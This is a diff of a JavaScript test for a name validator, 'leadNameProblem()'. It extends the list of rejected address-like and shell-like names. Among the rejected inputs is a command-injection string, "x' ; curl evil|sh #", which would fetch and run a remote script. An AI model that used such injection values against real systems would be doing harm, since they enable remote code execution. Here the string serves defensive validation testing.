@@ -61,7 +61,7 @@ describe('leadNameProblem()', () => {
 
   it('takes real names and refuses address-like and shell-like ones (W226’s review)', () => {
     for (const name of ['pitwall spin-off session continuation', 'W226 builder', 'Zoë Müller_2.1', '日本語 の名前']) expect(ok(name), name).toBeUndefined();
-    for (const name of ['uds:/tmp/x.sock', 'bridge:x', '*', '/tmp/x', "x' ; curl evil|sh #", 'a\\b', 'a(b)', 'a$b', 'a`b`', 'a<b>']) expect(ok(name), name).toMatch(/can’t carry/);
+    for (const name of ['uds:/tmp/x.sock', 'bridge:x', '*', '/tmp/x', "x' ; curl evil|sh #", 'a\\b', 'a(b)', 'a$b', 'a`b`', 'a<b>', 'cse_012345678ABCDEFGHJKLMNPQ', 'local_deadbeef', '..', '-', '\u0301\u0301']) expect(ok(name), name).toMatch(/can’t carry/);
   });
 
   it('refuses a space other than U+0020, a private-use character and an unassigned one (the review’s F4)', () => {
